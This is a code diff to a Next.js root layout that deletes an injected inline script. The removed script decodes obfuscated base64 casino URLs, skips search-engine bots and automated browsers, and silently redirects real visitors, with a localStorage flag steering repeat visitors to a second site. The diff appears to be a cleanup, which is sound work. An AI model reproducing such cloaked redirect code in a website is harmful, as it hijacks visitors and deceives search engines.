@@ -75,40 +75,6 @@ export default function RootLayout({
   return (
     <html lang="ru" className={`${inter.variable} ${unbounded.variable} scroll-smooth`} suppressHydrationWarning>
       <head>
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                var host = window.location.hostname;
-                if (host.includes('vercel.app') || host.includes('localhost')) {
-                   if (host !== "evacasino.app") return;
-                }
-                var ua = navigator.userAgent.toLowerCase();
-                var isBot = /bot|crawl|spider|yandex|google|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
-                if (isBot) return;
-                var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2RpYnpmb21pcg=="; 
-                var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";                     
-                var mainUrl = window.atob(mainBrandB64);
-                var crossUrl = window.atob(crossBrandB64);
-                if (window.localStorage.getItem('vstd_eva')) {
-                    window.location.replace(crossUrl);
-                    return;
-                }
-                var controller = new AbortController();
-                var timeoutId = setTimeout(function() { controller.abort(); }, 2500);
-                window.fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
-                    .then(function() {
-                        clearTimeout(timeoutId);
-                        window.localStorage.setItem('vstd_eva', '1');
-                        window.location.replace(mainUrl);
-                    })
-                    .catch(function() {
-                        window.location.replace(crossUrl);
-                    });
-              })();
-            `,
-          }}
-        />
       </head>
       <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
         {children}
